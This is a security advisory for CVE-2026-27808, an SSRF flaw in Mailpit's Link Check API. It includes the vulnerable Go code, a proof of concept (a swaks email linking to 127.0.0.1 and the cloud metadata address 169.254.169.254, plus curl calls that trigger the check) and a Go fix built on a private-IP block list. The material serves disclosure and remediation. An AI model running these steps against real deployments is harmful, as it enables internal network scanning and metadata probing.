{
  "id": "GHSA-mpf7-p9x7-96r3",
  "modified": "2026-02-26T15:32:54.458171Z",
  "published": "2026-02-26T15:18:46Z",
  "aliases": [
    "CVE-2026-27808"
  ],
  "summary": "Mailpit is Vulnerable to Server-Side Request Forgery (SSRF) via Link Check API",
  "details": "### Summary\nThe Link Check API (/api/v1/message/{ID}/link-check) is vulnerable to Server-Side Request Forgery (SSRF). The server performs HTTP HEAD requests to every URL found in an email without validating target hosts or filtering private/internal IP addresses. The response returns status codes and status text per link, making this a non-blind SSRF. In the default configuration (no authentication on SMTP or API), this is fully exploitable remotely with zero user interaction.\n\nThis is the same class of vulnerability that was fixed in the HTML Check API (CVE-2026-23845 / GHSA-6jxm-fv7w-rw5j) and the\nscreenshot proxy (CVE-2026-21859 / GHSA-8v65-47jx-7mfr), but the Link Check code path was not included in either fix.\n\n### Details\nThe doHead() function in https://github.com/axllent/mailpit/blob/v1.29.0/internal/linkcheck/status.go#L59-L98 creates a plain http.Transport{} and http.Client with no DialContext hook or IP validation:\n\n```\n  func doHead(link string, followRedirects bool) (int, error) {\n      timeout := time.Duration(10 * time.Second)\n      tr := \u0026http.Transport{}\n      // ...\n      client := http.Client{\n          Timeout:   timeout,\n          Transport: tr,\n          // ...\n      }\n      req, err := http.NewRequest(\"HEAD\", link, nil)\n      // ...\n      res, err := client.Do(req)  // No IP validation — requests any URL\n      return res.StatusCode, nil\n  }\n```\n\n  The call chain is:\n\n  1. GET /api/v1/message/{ID}/link-check hits LinkCheck() in\n  https://github.com/axllent/mailpit/blob/v1.29.0/server/apiv1/other.go#L84\n  2. Which calls linkcheck.RunTests() in https://github.com/axllent/mailpit/blob/v1.29.0/internal/linkcheck/main.go#L16\n  3. Which extracts all URLs from the email's HTML (\u003ca href\u003e, \u003cimg src\u003e, \u003clink href\u003e) and text body, then passes them to\n  getHTTPStatuses() in https://github.com/axllent/mailpit/blob/v1.29.0/internal/linkcheck/status.go#L14\n  4. Which spawns goroutines calling doHead() for each URL with no filtering\n\n  There is no check anywhere in this path to block requests to loopback (127.0.0.0/8), private (10.0.0.0/8, 172.16.0.0/12,\n  192.168.0.0/16), link-local (169.254.0.0/16), or IPv6 equivalents (::1, fc00::/7, fe80::/10).\n  \n### PoC\nPrerequisites: Mailpit running with default settings (no auth flags). A listener on 127.0.0.1:8081 simulating an internal service.\n\n Step 1 — Start a listener to prove the SSRF:\n\n`  python3 -m http.server 8081 --bind 127.0.0.1\n`\n\n Step 2 — Send a crafted email via SMTP:\n\n```\n  swaks --to recipient@example.com \\\n        --from attacker@example.com \\\n        --server localhost:1025 \\\n        --header \"Content-Type: text/html\" \\\n        --body '\u003chtml\u003e\u003cbody\u003e\u003ca href=\"http://127.0.0.1:8081/ssrf-proof\"\u003eclick\u003c/a\u003e\u003ca\n  href=\"http://169.254.169.254/latest/meta-data/\"\u003emetadata\u003c/a\u003e\u003c/body\u003e\u003c/html\u003e'\n```\n\n Step 3 — Get the message ID:\n\n`  curl -s http://localhost:8025/api/v1/messages?limit=1 | jq -r '.messages[0].ID'\n`\n  Or use the shorthand ID latest.\n\nStep 4 — Trigger the link check:\n\n`  curl -s http://localhost:8025/api/v1/message/latest/link-check | jq .\n`\n \nExpected result:\n\n  - The Python HTTP server on port 8081 logs a HEAD /ssrf-proof request from Mailpit.\n  - The API response contains the status code and status text for each internal target:\n\n```\n  {\n    \"Errors\": 0,\n    \"Links\": [\n      {\"URL\": \"http://127.0.0.1:8081/ssrf-proof\", \"StatusCode\": 200, \"Status\": \"OK\"},\n      {\"URL\": \"http://169.254.169.254/latest/meta-data/\", \"StatusCode\": 200, \"Status\": \"OK\"}\n    ]\n  }\n```\n\n\n-- This behavior can be identified by creating a email txt file as \n\n```\ncat email.txt \u003e \nFrom: sender@example.com\nTo: recipient@example.com\nSubject: Email Subject\n\nThis is the body of the email.\nIt can contain multiple lines of text.\nhttp://localhost:8408\n```\n\n- Start a Python server on port 8408\n\n- execute the command `mailpit sendmail \u003c email.txt ` \n\n- Observe a request to your python server and link status on the UI as OK\n\n\n The attacker now knows both internal services are reachable and gets their exact HTTP status codes, this allows internal port scanning\n\n### Impact\nWho is impacted: Any Mailpit deployment where an attacker can both send email (SMTP) and access the API. This includes the default configuration, which binds both services to all interfaces with no authentication.\n\n  What an attacker can do:\n\n  - Internal network scanning — Enumerate hosts and open ports on the internal network by reading status codes and error messages\n  (connection refused vs. timeout vs. 200 OK).\n  - Cloud metadata access — Reach cloud provider metadata endpoints (169.254.169.254) and infer sensitive information from response codes.\n  - Service fingerprinting — Identify what services run on internal hosts from their HTTP status codes and response behavior.\n  - Bypass network segmentation — Use the Mailpit server's network position to reach hosts that are not directly accessible to the attacker.\n\n  This is a non-blind SSRF: the attacker gets direct, structured feedback (status code + status text) for every URL, making\n  exploitation straightforward without any timing or side-channel inference.\n\n### Remediation\nThen standard Go library can be used to identify a local address being requested and deny it.   \n\n```\nfunc isBlockedIP(ip net.IP) bool {\n        return ip.IsLoopback() ||\n                ip.IsPrivate() ||\n                ip.IsLinkLocalUnicast() ||\n                ip.IsLinkLocalMulticast() ||\n                ip.IsUnspecified() ||\n                ip.IsMulticast()\n  }\n\n  - IsLoopback() — 127.0.0.0/8, ::1\n  - IsPrivate() — 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, fc00::/7\n  - IsLinkLocalUnicast() — 169.254.0.0/16, fe80::/10 (covers cloud metadata 169.254.169.254)\n  - IsLinkLocalMulticast() — 224.0.0.0/24, ff02::/16\n  - IsUnspecified() — 0.0.0.0, ::\n  - IsMulticast() — 224.0.0.0/4, ff00::/8\n```\n\n  And the safe dialer that uses it:\n\n``` \n func safeDialContext(dialer *net.Dialer) func(ctx context.Context, network, address string) (net.Conn, error) {\n        return func(ctx context.Context, network, address string) (net.Conn, error) {\n                host, port, err := net.SplitHostPort(address)\n                if err != nil {\n                        return nil, err\n                }\n\n                ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)\n                if err != nil {\n                        return nil, err\n                }\n\n                for _, ip := range ips {\n                        if isBlockedIP(ip.IP) {\n                                return nil, fmt.Errorf(\"blocked request to private/reserved address: %s (%s)\", host, ip.\n                        }\n                }\n\n                return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].IP.String(), port))\n        }\n  }\n```\n\n  Then the doHead() change — replace the bare transport with one that uses the safe dialer, and re-validate URLs on\n  redirect hops:\n\n```\n  func doHead(link string, followRedirects bool) (int, error) {\n        if !isValidLinkURL(link) {\n                return 0, fmt.Errorf(\"invalid URL: %s\", link)\n        }\n\n        dialer := \u0026net.Dialer{\n                Timeout:   5 * time.Second,\n                KeepAlive: 30 * time.Second,\n        }\n\n        tr := \u0026http.Transport{\n                DialContext: safeDialContext(dialer),\n        }\n\n        if config.AllowUntrustedTLS {\n                tr.TLSClientConfig = \u0026tls.Config{InsecureSkipVerify: true} // #nosec\n        }\n\n        client := http.Client{\n                Timeout:   10 * time.Second,\n                Transport: tr,\n                CheckRedirect: func(req *http.Request, via []*http.Request) error {\n                        if len(via) \u003e= 3 {\n                                return errors.New(\"too many redirects\")\n                        }\n                        if !followRedirects {\n                                return http.ErrUseLastResponse\n                        }\n                        if !isValidLinkURL(req.URL.String()) {\n                                return fmt.Errorf(\"blocked redirect to invalid URL: %s\", req.URL)\n                        }\n                        return nil\n                },\n        }\n\n        req, err := http.NewRequest(\"HEAD\", link, nil)\n        if err != nil {\n                logger.Log().Errorf(\"[link-check] %s\", err.Error())\n                return 0, err\n        }\n\n        req.Header.Set(\"User-Agent\", \"Mailpit/\"+config.Version)\n\n        res, err := client.Do(req)\n        if err != nil {\n                if res != nil {\n                        return res.StatusCode, err\n                }\n                return 0, err\n        }\n\n        return res.StatusCode, nil\n  }\n\n  func isValidLinkURL(str string) bool {\n        u, err := url.Parse(str)\n        return err == nil \u0026\u0026 (u.Scheme == \"http\" || u.Scheme == \"https\") \u0026\u0026 u.Hostname() != \"\"\n  }\n\n```\nThis fix should mitigate the reported SSRF.",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/axllent/mailpit",
        "purl": "pkg:golang/github.com/axllent/mailpit"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.29.2"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 1.29.1",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-mpf7-p9x7-96r3/GHSA-mpf7-p9x7-96r3.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/axllent/mailpit/security/advisories/GHSA-mpf7-p9x7-96r3"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27808"
    },
    {
      "type": "WEB",
      "url": "https://github.com/axllent/mailpit/commit/10ad4df8cc0cd9e51dea1b4410009545eef7fbf5"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/axllent/mailpit"
    },
    {
      "type": "WEB",
      "url": "https://github.com/axllent/mailpit/releases/tag/v1.29.2"
    }
  ]
}